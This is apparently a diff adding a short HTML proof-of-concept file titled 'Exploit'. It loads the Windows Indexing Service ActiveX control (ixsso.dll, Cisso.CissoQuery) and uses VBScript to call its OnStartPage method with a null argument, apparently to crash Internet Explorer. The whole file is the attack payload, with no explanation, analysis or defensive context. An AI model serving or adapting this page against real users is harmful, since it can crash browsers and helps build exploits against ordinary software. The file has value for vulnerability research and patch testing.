@@ -1,0 +1,15 @@
+&lt;html&gt;
+Exploit
+&lt;object classid=&#039;clsid:A4463024-2B6F-11D0-BFBC-0020F8008024&#039;
+id=&#039;target&#039; /&gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+targetFile = &quot;C:\WINDOWS\system32\ixsso.dll&quot;
+prototype  = &quot;Property Let OnStartPage As object&quot;
+memberName = &quot;OnStartPage&quot;
+progid     = &quot;Cisso.CissoQuery&quot;
+argCount   = 1
+
+Set arg1=Nothing
+
+target.OnStartPage arg1
+&lt;/script&gt;
